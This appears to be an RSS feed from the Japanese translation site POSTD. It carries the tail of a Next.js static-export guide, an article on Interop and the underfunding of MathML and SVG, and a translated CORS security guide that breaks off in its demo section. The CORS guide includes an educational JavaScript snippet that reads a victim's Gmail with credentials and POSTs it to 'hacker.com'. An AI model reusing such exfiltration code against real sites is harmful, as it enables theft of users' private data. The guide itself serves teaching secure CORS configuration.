          </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span><span class="token punctuation">></span></span><span class="token plain-text">Go to Home Page</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token plain-text">
        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token class-name">Link</span></span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> Custom404<span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ダイナミックルートでページが見つからないエラーを解決するために、<code class="language-text">pages</code>ディレクトリに<code class="language-text">404.tsx</code>ファイルを入れておく必要があります。
また、ビルド作成後にコードを実行するために、<code class="language-text">package.json</code>ファイルに次のコマンドを追加してください。</p>
<div class="gatsby-highlight" data-language="json"><pre style="counter-reset: linenumber NaN" class="language-json line-numbers"><code class="language-json"><span class="token property">"preview"</span><span class="token operator">:</span> <span class="token string">"serve out/ -p 3000"</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p>serveパッケージがない場合はインストールしてください。</p>
<div class="gatsby-highlight" data-language="shell"><pre style="counter-reset: linenumber NaN" class="language-shell line-numbers"><code class="language-shell"><span class="token function">npm</span> i <span class="token parameter variable">-D</span> serve</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p><code class="language-text">npm run build</code>と<code class="language-text">npm run preview</code>を実行した後、ポート3000でプロジェクトにアクセスできます。
コード全体は<a href="https://github.com/ikramdeveloper/i18n-nextjs-output-export">GitHub</a>にあります。一部微調整を加えていますので、よろしければご覧ください。
何かお気づきの点やエラーなどがあればぜひコメントをください。喜んでサポートいたします。よろしくお願いします！</p>]]></content:encoded></item><item><title><![CDATA[Interopと難解な問題]]></title><description><![CDATA[Webプラットフォームにおける優先事項、技術的負債、難解な問題について話しましょう... ブラウザエンジンプロジェクトは、他のほとんどのソフトウェアプロジェクトと多くの点で似ています。「管理者」は今…]]></description><link>https://postd.cc/Interop-and-hard-problems/</link><guid isPermaLink="false">https://postd.cc/Interop-and-hard-problems/</guid><category><![CDATA[開発手法・プロジェクト管理]]></category><category><![CDATA[Interop]]></category><pubDate>Fri, 21 Feb 2025 00:00:01 GMT</pubDate><content:encoded><![CDATA[<p><em>Webプラットフォームにおける優先事項、技術的負債、難解な問題について話しましょう...</em></p>
<p>ブラウザエンジンプロジェクトは、他のほとんどのソフトウェアプロジェクトと多くの点で似ています。「管理者」は今も、休職中のメンバーなどを考慮に入れながら、マネージャーが統括する専門チームを編成し、予算を割り当てます。優先事項を決め、綿密な計画を立てる必要があります。そして筆者がこれまで見てきたどのプロジェクトとも共通する点として、同じようなプレッシャーや問題に直面します。全ての作業に十分なリソースが確保できることはなく、常に何かしら新たな要求が追加され、技術的負債が積み上がり、時折本当に難解な問題が発生します。
ブラウザエンジンプロジェクトに特殊な点があるとすれば、独立したプログラム以上のものになろうとしていることでしょう。相互運用可能な標準プラットフォームに貢献しようとしているのです。私たちにとって問題なのは、チーム独自の優先事項を「全て」クリアし、一般向けにリリースされるなどして、初めてその恩恵が得られるということです。</p>
<p>これは実際に経験するとつらいものです。
<code class="language-text">&lt;details></code>要素を例に見てみましょう。これは文字通り最も単純なインタラクティブ要素です。これまでの経緯を以下に整理します。</p>
<ul>
<li>2011年6月にChromeが<code class="language-text">&lt;details></code>を導入</li>
<li>1年後の2012年7月にSafariが導入</li>
<li>その1年後の2013年7月にOperaが導入</li>
<li>その3年後の2016年9月にFirefoxが導入</li>
<li>Microsoftは導入せず、2020年にEdgeがChromium版に移行してようやく導入</li>
</ul>
<p>リリースから全てのブラウザに導入されるまで9年もかかりました。新たに定義された、ブラウザ普及率が100%に限りなく近い状態になったことを示す「<a href="https://web.dev/baseline">Baseline: Widely Available</a>」の条件を満たすのにさらに3年かかります。つまり、実質的には昨年ようやくWidely Availableとなったということです。</p>
<p>しかも、これはまだ初期段階であり、かつ魅力的な部分にすぎません。当然、これからバグが見つかって、新たなテストが追加され、最終的には改良版やアップグレードなどがリリースされます。現在も、ページ内検索などを改善したり、呼び出し元などの新しい概念を追加したりするたびに、テストが失敗する場合があり、<code class="language-text">&lt;details></code>のサポート状況をばらばらなものにしています。</p>
<p>時間とともに、機能マトリクスの項目は増え続け、要件をクリアするよりも速いペースで未対応事項が増えています。技術的負債は積み上がる一方です。</p>
<h2>Interopの登場</h2>
<p>Interopは当初、技術的負債を減らすための手段として考案されました。優先事項を協力して選び、不合格を示す赤い四角を全部緑色に変えていく取り組みです。しかし、優先事項の判断は難しい問題です。</p>
<p>私たちは毎年おおよそ100件程度の要件を優先事項として指定されます。しかし、Interopは単にブラウザメーカーが同じ優先事項に合意する手助けをしているにすぎません。リソース自体が有限なのは変わりません。つまり、何かを優先するということは、必然的に他のものは優先しないということになります。</p>
<p>また、何を優先するか、なぜ優先すべきかについて、多くの競合圧力を各方面から受けます。</p>
<p>例えば、初期開発に共同で集中的に取り組むことができれば、デベロッパーにとっては極めて効率的です、といったことを言われるわけです。2011年、あるいは2012年に<code class="language-text">&lt;details></code>を極めて高い品質で全てのブラウザに実装できていたらどうだったか、想像してみてください。</p>
<p>いくつかの新機能に共同で取り組む利点は他にもあります。まず、開発に携わる人々の熱意が違います。また、誰もが同じテーマについて同時に話すようになるため、誰も大きなイベントを見逃すことがなくなります。その結果、普及も早まります。ECMAの年次版のようなものも得られます。したがって、<a href="https://wpt.fyi/interop-2024">昨年Interop</a>がCSSネスティング、ポップオーバー、相対カラー構文、宣言型Shadow DOMなどの領域を追加したのは意外ではありません。</p>
<p>しかしその一方で、すでにサポート状況がばらばらな機能も多くあります。これらは優先順位を判断するのが極めて難しく、いたるところに見られます。当然それぞれ価値が異なり、その価値についても議論の余地があります。対象となるコミュニティが全く異なる場合もあります。エンジンによってかかるコストが違う場合もあります。
こうした状況が重なることで、常に難解な問題がつきまといます。ニーズとしていつまでも、時に極めて長い期間残り続けます。</p>
<h2>長期間にわたる難解な問題</h2>
<p>こうした長期間にわたる難解な問題については、どういうわけか一向に優先順位が決まりませんが、筆者は今年、これらの問題を優先順位付けする方法を見つけなければならないと主張したいと思います。5年、7年、あるいは10年ごとに、こうしたプロジェクトに集中して取り組む必要があるかもしれません。</p>
<p>筆者のブログの読者やIgalia社のポッドキャストのリスナーは、MathML（Mathematical Markup Language）とSVGがおそらくこうした問題の最たる例であることをご存じでしょう。いずれも最古のWeb規格に数えられ、最初のバージョンがリリースされた時期はHTML4.0やCSS2と重なります。HTMLパーサーに特別に組み込まれ、現在はHTML Living Standard（<a href="https://html.spec.whatwg.org/#mathml">MathML</a>、<a href="https://html.spec.whatwg.org/#svg-0">SVG</a>）に組み込まれています。</p>
<p>しかし、いずれも歴史的に大幅な資金不足の状態にあり、実際の作業の大半はボランティアや管理者以外の組織が担っています。26年が経った今もなお、最後の重要な作業に取り組む決心ができないのです。</p>
<p>そのため、Interopには毎年両方について要望が寄せられています。</p>
<p>2024年の「State of HTML」アンケートでは、<a href="https://state-of-html-2024.onrender.com/en-US/features/content/">デベロッパーが挙げるコンテンツの課題</a>として<code class="language-text">&lt;svg></code>がトップに選ばれ、「ブラウザサポート」に起因する課題の倍近くの得票数でした。SVGの他の使用方法は含めず、<code class="language-text">&lt;svg></code>要素だけでも<a href="https://rainy-periwinkle.glitch.me/permalink/831113a2f130c21a753ff9404067a47eaa893bc7fbc3f973a012d50e67123cf2.html">HTTPアーカイブデータのHTMLページの55%以上</a>で使われています。約130個あるHTMLの要素のうち、<code class="language-text">&lt;svg></code>よりも使用されているhtml要素は27個だけです。SVGは、Webエンジンを利用する埋め込みアプリケーションでも多用されています。</p>
<p>数式コンテンツは、arXivやWikipediaなど無数の数式を使用する特定のサイトや、オンライン教育や書籍に多く見られます。HttpArchiveのクロールは、主にあまり数式が使われない一般向けのホームページを対象にしているため、その測定にはあまり向いていません。しかしクロールでも、ネイティブ関数のレンダリングではなくギャップの橋渡しを行う最も一般的な2つのJavaScriptライブラリが、多くのページで読み込まれるのを見ます。これはパフォーマンスに悪影響を及ぼしますが、特殊な問題です。テキストのレンダリングにJavaScriptは必要ありません。また、Adobe InDesignやMicrosoft Wordなどの多くのドキュメント編集ツールもMathMLをサポートしています。これらはすでに多くのスクリプトが要求される複雑なアプリケーションであり、もしサポートが不十分な場合、さらに多くのスクリプトを読み込む必要があるということです。</p>
<p>Igalia社は、資金提供を受けながら自社資金も投じて実装や改善を行ってきました。開発を前に進めるために、私たちは毎年一定の出資を行っています。しかし、この方法では遅々として進みません。最後の作業を成し遂げるためには、共同での取り組みが必要です。そうすれば、はるかに速いペースで前に進み、大いに改善できるはずです。</p>
<p>これらの問題に集中的に取り組み、改善を推し進める考えに賛同していただける方は、ぜひ私たちや他のベンダーにご連絡ください。力になっていただけると思います。</p>
<p>もちろん、そう簡単には行かない可能性もあると思います。これまではそうでした。ベンダー以外の開発者が作業を行うことや、外部からの資金提供が有効であることは実証済みです。Igalia社はこれからも地道な取り組みを続けていきますが、外部からの資金提供がなければ、自らの出資だけでは限界があります。これらの取り組みの恩恵を受ける企業には、一部の作業への出資をご検討いただけるとありがたいです。もしくは、<a href="https://opencollective.com/mathml-core-support">MathMLに関する作業に直接出資</a>していただくことも可能です。</p>]]></content:encoded></item><item><title><![CDATA[CORSガイドの決定版]]></title><description><![CDATA[無垢な仔猫の写真を集めたウェブサイトを訪問したと想像してみてください。かわいい仔猫達の写真の背後には、このウェブサイトの強大な力が隠れています。誰かがウェブサイトにアクセスすると、サイトのオーナーは…]]></description><link>https://postd.cc/cors-the-ultimate-guide/</link><guid isPermaLink="false">https://postd.cc/cors-the-ultimate-guide/</guid><category><![CDATA[開発手法・プロジェクト管理]]></category><category><![CDATA[CORS]]></category><category><![CDATA[Ajax]]></category><pubDate>Fri, 24 Jan 2025 00:00:01 GMT</pubDate><content:encoded><![CDATA[<p>無垢な仔猫の写真を集めたウェブサイトを訪問したと想像してみてください。かわいい仔猫達の写真の背後には、このウェブサイトの強大な力が隠れています。誰かがウェブサイトにアクセスすると、サイトのオーナーはその訪問者のネット上の行動に関するあらゆる情報を入手できます。その中には、銀行取引情報、SNS上の投稿やメッセージ、メール、オンラインの購買データなどが含まれます。あなたが受ける信用面や金銭面の損害はどれほどのものになるでしょうか。あなたのメッセージが流出し、銀行口座のお金が使い込まれるかもしれません。しかし幸いなことに、実際にはそのような状況は起こりません。それは、<a href="https://en.wikipedia.org/wiki/Same-origin_policy">SOP</a>とCORSのお陰なのです。</p>
<h3>目次</h3>
<ol>
<li>Ajax（Asynchronous JavaScript And XML）</li>
<li>インターネットがジャングルではない理由</li>
<li>認証情報を「含める」vs「含めない」</li>
<li>CORSルールの定義</li>
<li>クロスオリジンリクエストの処理
<ol>
<li>リクエストするか否か</li>
<li>アクセスを許可するか拒否するか</li>
<li>CORSポリシーのチェック</li>
</ol>
</li>
<li>CORSポリシーの誤設定による危険</li>
<li>デモ</li>
<li>安全なCORSポリシーを定義する方法</li>
<li>CSRF対策としてのCORS設定</li>
<li>設定ミスで墓穴を掘らない</li>
</ol>
<h2>Ajax（Asynchronous JavaScript And XML）</h2>
<p>少し前の技術になりますが、皆さんがよくご存知の<a href="https://en.wikipedia.org/wiki/Ajax_(programming)">Ajax</a>についてまずお話します。Ajaxとは、ブラウザがバックグラウンドでリクエストを送信できるようにするためのJavaScriptの仕組みです。ウェブサイトのクライアントサイドアプリケーションでは、一般的にAjaxを使用してAPIサーバーに情報をリクエストします。Ajaxはクライアント側で実行されます。つまり、ユーザーがウェブサイトにアクセスする際、ブラウザがAjaxリクエストを送信するということです。この記事では、ボブという名前のインターネットユーザーの事例を検討してみましょう。</p>
<p>example.comというウェブサイトにリクエストを送信する際、Ajaxに「認証情報を使用する」よう伝えることができます。この場合、ブラウザはボブが<code class="language-text">example.com</code>に関するCookieを保存しているかチェックします。保存している場合、ブラウザはAjaxリクエストによりCookieを送信します。ボブがexample.com上で認証されれば、ウェブサイトはボブを認識します。ブラウザはボブのIDでAjaxリクエストを送信します。
<img src="https://www.devsecurely.com/blog/wp-content/uploads/2024/06/exported_image-1-1024x350.png"></p>
<h2>インターネットがジャングルではない理由</h2>
<p>あなたがサイバーセキュリティに熱心であれば、ある疑問が思い浮かんだかもしれません。すなわち、もし自分が悪意のあるウェブサイトを作成したならば、認証情報を<strong>含めて</strong>GmailのウェブサイトにAjaxリクエストを送信し、訪問者のメールをすべて取得すればよいのではないか、という疑問です。</p>
<p>この疑問が浮かんだ方は、悪の才能があるかもしれません。ですが、その企みはうまく行きません。<strong>SOP</strong>と<strong>CORS</strong>という2つの仕組みがあるからです。</p>
<p>SOPはSame Origin Policyの略で、「同一オリジンポリシー」という意味です。この仕組みは、ウェブサイトAがオリジンの異なるウェブサイトBのリソースを読み込めないようにするものです。SOPは、ウェブサイトとサイト上に保存されたユーザーのデータが、悪意のあるウェブサイトによってアクセスされないよう保護します。</p>
<p>CORSはCross-Origin Resource Sharingの略で、「オリジン間リソース共有」という意味です。CORSは、SOPの仕組みに例外を追加できる一連のルールです。SOPのポリシーを緩めることで、ウェブサイトAがオリジンの異なるウェブサイトBからリソースを読み込めるようにします。</p>
<p>ウェブサイトのオリジンは、ドメイン、プロトコルスキーム、ネットワークポートの組み合わせです。2つのURLの間でこれらのいずれかが異なる場合、ブラウザはオリジンが異なるとみなします。<a href="https://www.devsecurely.com/">https://www.devsecurely.com/</a>を例に見てみましょう。このウェブサイトが以下のいずれかのウェブサイトにAjaxリクエストを送信した場合、ブラウザはクロスオリジン（異なるオリジン）とみなします。</p>
<ul>
  <li><span style="color: red; font-weight: bold;">http</span>://www.devsecurely.com/</li>
  <li>https://<span style="color: red; font-weight: bold;">api</span>.devsecurely.com/</li>
  <li>https://www.<span style="color: red; font-weight: bold;">gmail</span>.com/</li>
  <li>https://www.devsecurely.com:<span style="color: red; font-weight: bold;">8443</span>/</li>
</ul>
<p>ウェブサイトがオリジンの異なるURLにHTTPリクエストを送信した場合、このリクエストは<strong>クロスオリジンリクエスト</strong>とみなされます。<strong>同一オリジンリクエスト</strong>とは扱いが異なります。クロスオリジンリクエストの扱い方に関するルールは複雑です。この記事では、すべての要素とルールを見ていきます。準備はいいですか？</p>
<h2>認証情報を「含める」vs「含めない」</h2>
<p>まずは認証情報を使用するか否かでAjaxリクエストにどのような影響があるのか見てみましょう。明確化のため、<code class="language-text">https://hacker.com</code>から<code class="language-text">https://gmail.com</code>にAjaxリクエストを送信する例について検討します。</p>
<p>「認証情報を含める」は、Ajaxで有効化できるオプションです。ブラウザに対し、Gmail上のユーザーのCookieをAjaxリクエストに含めるよう指示します。そうすることで、Gmailはボブのブラウザから送られたリクエストであると分かります。レスポンスには、ボブのGmailアカウントに関連する情報が含まれます。例えば、<code class="language-text">https://gmail.com/emails</code>に対してAjaxリクエストを送ると、レスポンスにはボブのメールが含まれます。</p>
<p>これは危険なシナリオです。どのウェブサイトでもAjaxリクエストを送ることで訪問者のメールを取得することが出来たなら、インターネットは野生のジャングルのようになってしまうでしょう。インターネットプロトコルを設計したエンジニアたちが、そうならないようにしたのです。</p>
<p>一方で、「認証情報を含める」を有効化しなかった場合、AjaxリクエストにはCookieは含まれません。Gmailのウェブサイトは、ボブが別のブラウザタブでGmailアカウントにログインしていたとしても、ボブのブラウザを匿名のユーザーとして扱います。したがって、Ajaxリクエストに対するレスポンスには、一切個人情報は含まれません。</p>
<h2>CORSルールの定義</h2>
<p>ブラウザは、ウェブサイトAからウェブサイトBにAjaxリクエストを送る際、ウェブサイトBのCORSルールを参照し、どのように振る舞うかを判断します。ブラウザが従うCORSルールを定義するのはウェブサーバーBです。これらのルールは、特定のHTTPレスポンスヘッダー内で定義されます。最も重要なヘッダーは<strong>Access-Control-Allow-Origin</strong>と<strong>Access-Control-Allow-Credentials</strong>です。それぞれの役割と取り得る値については後ほど説明します。</p>
<h2>クロスオリジンリクエストの処理</h2>
<p>あるウェブサイトが別のウェブサイトにAjaxリクエストを行った場合（クロスオリジンリクエスト）、ブラウザはCORSポリシーを確認し、Ajaxリクエストの扱い方を判断します。
ブラウザは次の2つについて判断する必要があります。</p>
<ol>
<li>JavaScriptコードで定義されているようにHTTPリクエストを行うべきか？</li>
<li>ブラウザがリクエストを行った場合、JavaScriptコードがレスポンスにアクセスできるようにするべきか？
これら2つのステップを掘り下げて見てみましょう。</li>
</ol>
<h2>リクエストするか否か</h2>
<p>一部のAjaxの設定の仕方によっては、、ブラウザはCORSポリシーをチェックせずにリクエストを行います。そうでない場合は、ブラウザはCORSポリシーをチェックした上でリクエストを行うか否かを判断する必要があります。後者の場合、ブラウザはまずHTTP OPTIONSリクエストをURLに対して行い、CORSポリシーを取得します。これをプリフライトリクエストと言います。</p>
<p>ブラウザがどのようにしてCORSポリシーチェックを行うかは後ほど説明します。ここでは、<a href="https://en.wikipedia.org/wiki/Cross-origin_resource_sharing">ウィキペディア</a>にある以下のデシジョンツリー（決定木）を見てみましょう。ブラウザがリクエストを行う前にCORSポリシーをチェックする際の条件が説明されています。
<img src="https://www.devsecurely.com/blog/wp-content/uploads/2024/06/CORS.png">
CORSチェックなしでブラウザがリクエストを行う条件を以下に挙げます。</p>
<ul>
<li>AjaxリクエストがGETリクエストであり、カスタムHTTPヘッダーがない。</li>
<li>AjaxリクエストがPOSTリクエストであり、標準のContent-Typeで、カスタムHTTPヘッダーがない。</li>
</ul>
<p>ブラウザはなぜCORSポリシーをチェックせずにこれらのリクエストを行うのでしょうか。それは、これらがAjaxを使わずにウェブサイトが実行できるリクエストだからです。</p>
<ul>
<li>カスタムHTTPヘッダーのないGETリクエストは、HTMLのimgタグまたはiframeタグを使用してトリガーできます。src属性の中でターゲットURLを宣言するだけです。ページをレンダリングする際、ブラウザがURLに対して認証情報を含むGETリクエストを行い、リソースを読み込みます。</li>
<li>HTMLのformタグを使用し、カスタムHTTPヘッダーなしで、標準のContent-TypeによりPOSTリクエストをトリガーできます。POST属性はすべてHTMLのinputタグを使用して追加でき、JavaScriptを使用してフォームを送信し、リクエストを実行できます。</li>
</ul>
<p>他のすべてのシナリオでは、ブラウザはプリフライトリクエストを行います。次にCORSポリシーをチェックし、リクエストを送信するか判断します。</p>
<ul>
<li>HTTPのPUT、DELETEまたはその他のリクエスト</li>
<li>HTTPのPOSTリクエストで、application/jsonなど標準以外のContent-Typeを使用</li>
<li>HTTPのGETまたはPOSTリクエストで、X-Requested-With: XMLHttpRequestなどのカスタムHTTPヘッダーを使用</li>
</ul>
<h2>アクセスを許可するか拒否するか</h2>
<p>ブラウザは、Ajaxリクエストを行う場合、JavaScriptコードがレスポンスにアクセスできるようにするか判断する必要があります。ブラウザはレスポンスからCORSポリシーを取得し、AjaxリクエストがCORSポリシーと一致するか確認します。
一致する場合、JavaScriptコードはレスポンスにアクセスできます。一致しない場合、JavaScriptコードはレスポンスにアクセスできず、JavaScriptコンソールにエラーメッセージが表示されます。
次のセクションでは、CORSポリシーのチェックプロセスについて説明します。</p>
<h2>CORSポリシーのチェック</h2>
<p>要約すると、ブラウザは以下の2つのケースでCORSポリシーをチェックします。</p>
<ol>
<li>標準以外のHTTPリクエストを送信する前。</li>
<li>レスポンスへのアクセスを許可するかどうか判断する前。</li>
</ol>
<p>ブラウザは以下の要素をチェックします。</p>
<ul>
<li>ブラウザは<strong>Access-Control-Allow-Origin</strong>レスポンスヘッダーの値を取得します。値はAjaxリクエストを行ったウェブサイトのオリジンと一致しなくてはいけません。オリジンの形式は「schema://fqdn:port」です。
<ul>
<li><strong>Access-Control-Allow-Origin</strong>レスポンスヘッダーがない場合、チェックは失敗します。</li>
<li>実は、<strong>Access-Control-Allow-Origin</strong>ヘッダーにワイルドカード文字の「*」が指定されている場合もチェックは失敗します。</li>
</ul>
</li>
<li>「認証情報を含めて」リクエストを行う場合： <strong>Access-Control-Allow-Credentials</strong>レスポンスヘッダーがあり、値は「true」が設定されている必要があります。</li>
<li>カスタムHTTPヘッダーを1つ以上設定してAjaxリクエストを行う場合：ブラウザは<strong>Access-Control-Allow-Headers</strong>レスポンスヘッダーの値を取得します。このヘッダーの値には、リクエストで使用されたカスタムHTTPヘッダーがすべて含まれている必要があります。</li>
<li>AjaxリクエストタイプがGET、POST、HEADのいずれでもない場合：ブラウザは<strong>Access-Control-Allow-Methods</strong>レスポンスヘッダーの値を取得します。値には、Ajaxクエリによって定義されたHTTPリクエストタイプが含まれている必要があります。</li>
</ul>
<p>これらの条件のいずれかが満たされていない場合、CORSポリシーのチェック全体が失敗して以下の結果となります。
ブラウザがリクエストを行う前にCORSチェックを実行する場合、リクエストを送信しません。
ブラウザがリクエストを行った後でCORSチェックを実行する場合、JavaScriptコードはレスポンスにアクセスできません。</p>
<p>以下の図はCORSのデシジョンツリーをまとめたものです。
<img src="https://www.devsecurely.com/blog/wp-content/uploads/2024/07/recap3-1024x623.png"></p>
<div class="twitter_follow"><span>セキュリティを万全に保ちたい方は、筆者らのXで役に立つ情報やセキュリティニュースのダイジェストを提供しているのでぜひフォローしてください</span><br/><a href="https://twitter.com/devsecurely?ref_src=twsrc%5Etfw" class="twitter-follow-button" data-show-count="false">Follow @Devsecurely</a><script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script><style type="text/css" scoped>.twitter_follow span{font-size:17px;color:#000}.twitter_follow{text-align:center;--style-box-shadow-style-type: ;--style-box-shadow-distance-x:0px;--style-box-shadow-distance-y:0px;--style-box-shadow-blur:36px;--style-box-shadow-spread:4px;--style-box-shadow-color:rgb(0, 0, 0, 0.12);box-shadow:var(--style-box-shadow-style-type) var(--style-box-shadow-distance-x) var(--style-box-shadow-distance-y) var(--style-box-shadow-blur) var(--style-box-shadow-spread) var(--style-box-shadow-color);padding:8px 12px;border-radius:10px;border:1px solid #e7e7e7;background-color:#c0708c4a}.twitter_follow iframe{margin-top:10px}</style></div>
<h2>CORSポリシーの誤設定による危険</h2>
<p>ブラウザのメンテナーがユーザーを保護するためにCORSの仕組みを設計しました。ユーザーがうっかり悪意のあるウェブサイトにアクセスしてしまうかもしれないからです。優れたCORSポリシーは、悪意のあるウェブサイトがユーザーのIDを使ってあなたのウェブサイトにHTTPリクエストを送信できないようにします。</p>
<p>CORSポリシーは、HTTPレスポンスヘッダーを用いて定義されます。したがって、デベロッパーには他のオリジンからの悪意のあるリクエストを防ぐことができる、十分厳格なCORSポリシーを定義することが求められます。</p>
<p>CORSは、Cookie（セッションCookieなど）を使用してユーザー認証を行うウェブサイトに特に関係します。これは、「認証情報を含める」Ajax設定の場合、ブラウザが自動的にCookieをリクエストとともに送信するからです。そうすると、リクエストは正当なユーザーから届いたように見えます。</p>
<p>では、他の認証方法を使用する場合はどうでしょうか。例えば、HTTPの「Authorization」ヘッダーで認証トークンを送信するとします。その場合、CORSポリシーはあまり関係ありません。悪意のあるウェブサイトがAjaxリクエストを行っても、ブラウザはリクエストにトークンを追加しません。そのため、悪意のあるウェブサイトは正規のウェブサイトのローカルストレージにアクセスできません。トークンにアクセスできないため、Ajaxのリクエストに含めることができません。あなたのウェブサイトは、何もせずともこの攻撃シナリオからは保護されます。</p>
<p>Cookieによる認証の場合、CORSポリシーが甘いと悪いことが起こる可能性があります。ユーザーが悪意のあるウェブサイトにアクセスした際、以下のような攻撃シナリオが考えられます。</p>
<ul>
<li>悪意のあるウェブサイトがAjaxリクエストを行い、Gmail上のユーザーのメールを取得します。次にJavaScriptコードがそれらのメールをウェブサイトを作成したハッカーに送ります。</li>
<li>悪意のあるウェブサイトは、Gmailに対して特定のHTTP POSTリクエストを行うことができます。このリクエストはユーザーの設定を変え、ハッカーが被害者であるユーザーの名前でメールを送信できるようにします。
悪意のあるウェブサイトは、Gmailに対して特定のHTTP POSTリクエストを行い、被害者のパスワードを変更することができます。</li>
</ul>
<p>以下のJavaScriptコードのスニペットは、攻撃者がどのようにして被害者のメールを取得し、自分のサーバーに送信するのかを示します。取得したメールはサーバーに保存し、後で参照することができます。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span> <span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'https://gmail.com/emails'</span><span class="token punctuation">)</span>
xhr<span class="token punctuation">.</span>withCredentials <span class="token operator">=</span> <span class="token boolean">true</span>
xhr<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>status <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token keyword">var</span> xhr2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
xhr2<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span> <span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'https://hacker.com/save_emails'</span><span class="token punctuation">)</span>
<span class="token keyword">var</span> params <span class="token operator">=</span> <span class="token string">'emails='</span><span class="token operator">+</span>xhttp<span class="token punctuation">.</span>responseText<span class="token punctuation">;</span>
xhr2<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>以下はこのシナリオをイラストで表したものです。
<img src="https://www.devsecurely.com/blog/wp-content/uploads/2024/06/exported_image2-1024x341.png">
ここで紹介した例は単に説明を目的としたものです。Gmailにはそのような攻撃を防ぐ優れたCORSポリシーがあります。実際に効果を見ていただけるよう、例としてウェブサイトを作成してみました。</p>
<h2>デモ</h2>
<p>この攻撃について説明するため、シンプルで脆弱なウェブサイトを作成しました。このデモサイトは、認証が必要なウェブアプリケーションをシミュレーションします。まず、次のURLにアクセスし、ボタンをクリックしてログインしてください。<a href="https://demo.devsecurely.com/demo_cors">https://demo.devsecurely.com/demo_cors</a></p>
<p>ログインしたら、以下のボタンをクリックしてください。先ほどのURLに対し、認証情報を含めたAjaxリクエストが送信されます。</p>
<p>(※訳注：POSTDでは文章の翻訳のみ掲載しています)</p>
<p>[原文：「攻撃開始」ボタン]</p>
<p>Ajaxリクエストの結果が以下に表示されます。</p>
<p>[原文：結果表示エリア]</p>
<p>手順に従うと、あなたのパブリックIPアドレスが上に表示されるはずです。「攻撃開始」ボタンをクリックしたとき、あなたのブラウザは以下のJavaScriptコードを実行しました。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">var</span> xhttp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhttp<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>status <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>responseText<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">"Your IP address"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
